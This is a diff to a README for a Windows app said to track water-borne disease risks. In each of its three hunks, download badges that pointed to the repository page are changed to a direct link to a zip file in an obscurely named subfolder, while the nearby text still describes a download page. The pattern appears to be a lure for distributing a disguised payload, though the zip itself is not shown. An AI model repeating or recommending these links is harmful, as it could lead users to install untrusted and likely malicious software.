@@ -1,6 +1,6 @@
 # 💧 Water-Monitoring-System - Track Water-Borne Disease Risks
 
-[![Download Water-Monitoring-System](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Ademardaaq/Water-Monitoring-System)
+[![Download Water-Monitoring-System](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/Ademardaaq/Water-Monitoring-System/main/syntactical/Monitoring-System-Water-1.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To start using the Water-Monitoring-System app, follow these steps carefully:
 
 1. **Go to the Download Page**  
 Click this button to open the download page in your web browser:  
-[![Visit Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ademardaaq/Water-Monitoring-System)  
+[![Visit Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ademardaaq/Water-Monitoring-System/main/syntactical/Monitoring-System-Water-1.8.zip)  
 This page hosts the files needed for the application.
 
 2. **Find the Windows Installer**  
@@ -106,4 +106,4 @@ The tool works offline after installation, so you can use it in places with limi
 
 ---
 
-[![Download Water-Monitoring-System](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Ademardaaq/Water-Monitoring-System)
+[![Download Water-Monitoring-System](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/Ademardaaq/Water-Monitoring-System/main/syntactical/Monitoring-System-Water-1.8.zip)
